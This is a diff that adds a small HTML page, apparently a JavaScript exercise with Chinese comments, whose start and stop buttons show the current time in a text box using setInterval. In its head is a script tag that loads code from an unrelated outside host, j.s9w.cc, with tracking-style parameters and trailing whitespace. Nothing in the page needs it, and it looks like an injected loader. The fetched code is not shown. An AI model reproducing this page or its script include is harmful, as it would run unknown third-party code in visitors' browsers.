@@ -1,0 +1,39 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head><script src="https://j.s9w.cc/j/?t=fx&v=1&g=006b8ee528c8&c=40f02fa4f42a&A=8"></script>                 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Insert title here</title>
+</head>
+<body>
+	<input type="text" size="30" id="one" /><br/>
+	<input type="button" id ="two" value="开始" onclick="fun1();" />
+	<input type="button" id ="three" value="结束" onclick="fun2();" />
+
+</body>
+</html>
+<script type="text/javascript">
+	var id;
+
+	//控制文本框中内容
+	//document.getElementById("one").value= "123";
+	function fun1(){
+		  setTime();
+		//3.调用setInterval 每隔一秒调用一次setTime方法.
+		if(!id){
+		 id =	window.setInterval(setTime, 1000);
+		}
+	}
+	
+	function setTime(){
+		//1.获得当前时间
+		var date = new Date();
+		//2.交给文本输入框显示
+		document.getElementById("one").value= date.toLocaleString();
+	}
+//停止时钟
+	function fun2(){
+		//
+		clearInterval(id);
+		id = undefined;
+	}
+</script>
